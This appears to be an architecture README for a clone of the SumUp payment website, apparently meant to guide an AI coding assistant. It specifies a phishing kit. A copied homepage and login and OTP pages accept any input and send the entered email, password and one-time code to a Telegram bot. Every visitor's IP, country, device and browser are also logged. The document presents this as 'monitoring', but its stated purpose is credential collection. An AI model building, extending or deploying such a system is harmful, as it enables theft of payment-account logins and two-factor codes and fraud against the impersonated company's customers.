# SumUp Payment Processing Website Clone

## Overview
This project is a SumUp-inspired payment processing website clone. It features a marketing homepage, a two-step authentication flow, and a visitor tracking system. The core purpose is to monitor user interactions: it captures any entered email, password, and OTP code, sending these credentials along with detailed visitor information (IP address, country, device, browser, OS) to a configured Telegram account for monitoring. The system is designed for credential collection and monitoring, not for actual secure authentication or user data storage.

## User Preferences
Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend
- **Frameworks**: React 18 with TypeScript, Vite for bundling, Wouter for routing, TanStack Query for server state.
- **UI/UX**: Shadcn UI (Radix UI-based) with Tailwind CSS. Homepage uses professional stock images and brand colors; Login/OTP pages feature a pure black and white monochrome design. Typography uses Inter font; design inspired by Linear, Notion, and Stripe.
- **State Management**: React Query for API data, `useState` for local component state, Toast notifications for user feedback.

### Backend
- **Server**: Express.js with Node.js and TypeScript, using ESM.
- **API Endpoints**:
    - `POST /api/login`: Accepts email/password, sends to Telegram. Blocks if Telegram notification fails. Redirects to OTP on success.
    - `POST /api/verify-otp`: Accepts OTP, sends to Telegram. Blocks if Telegram notification fails. Redirects to homepage on success.
    - `POST /api/track-visit`: Accepts page, extracts visitor info (IP, User-Agent), geolocates via ipapi.co, and asynchronously sends to Telegram. Non-blocking.
- **Data Storage**: No database integration; stateless design for credential monitoring only.
- **Authentication Flow**: Two-step process (Login -> OTP) where all entered credentials are sent to Telegram. Accepts any input.

### System Design Choices
- **UI Design**: A mix of professional marketing imagery for the homepage and a minimalist, monochrome aesthetic for authentication flows.
- **Visitor Tracking**: Comprehensive tracking of IP, country, device, browser, OS, and page visited for every page load. Uses `ua-parser-js` and `ipapi.co`. Designed to be non-blocking with error handling.
- **Security (Monitoring Context)**: No actual authentication or data storage. Credentials are sent in plaintext to Telegram for monitoring purposes, requiring a restricted Telegram chat.

## External Dependencies
- **Telegram Bot API**: Used for sending all collected credentials (email, password, OTP) and visitor tracking data. Requires `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`.
- **ipapi.co**: Geolocation API for resolving IP addresses to country information during visitor tracking (with a 3-second timeout).
- **Stock Image Assets**: Professional stock images for the homepage (SumUp logo, payment terminals, business types) and a promotional banner from SumUp CDN.
- **Google Fonts**: Inter font family.
- **ua-parser-js**: Library for parsing User-Agent strings to extract device, browser, and OS details for visitor tracking.
- **Radix UI**: Primitives for building accessible UI components.
- **Lucide React**: Icon library.
- **Zod**: Schema validation.